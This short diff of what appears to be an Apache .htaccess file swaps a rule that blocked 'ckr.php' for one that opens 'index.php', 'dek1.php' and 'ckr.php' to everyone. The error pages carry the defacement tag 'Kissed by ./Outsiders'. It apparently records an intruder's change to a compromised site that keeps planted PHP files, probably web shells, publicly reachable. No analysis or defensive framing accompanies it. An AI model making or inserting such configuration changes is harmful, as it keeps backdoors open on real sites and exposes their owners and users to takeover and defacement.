@@ -58,8 +58,8 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(ckr.php)$">
-    Deny from all
+<FilesMatch "^(index.php|dek1.php|ckr.php)$">
+    Allow from all
 </FilesMatch>
 ErrorDocument 403 "wut wut - Kissed by ./Outsiders"
 ErrorDocument 404 "wut wut - Kissed by ./Outsiders"
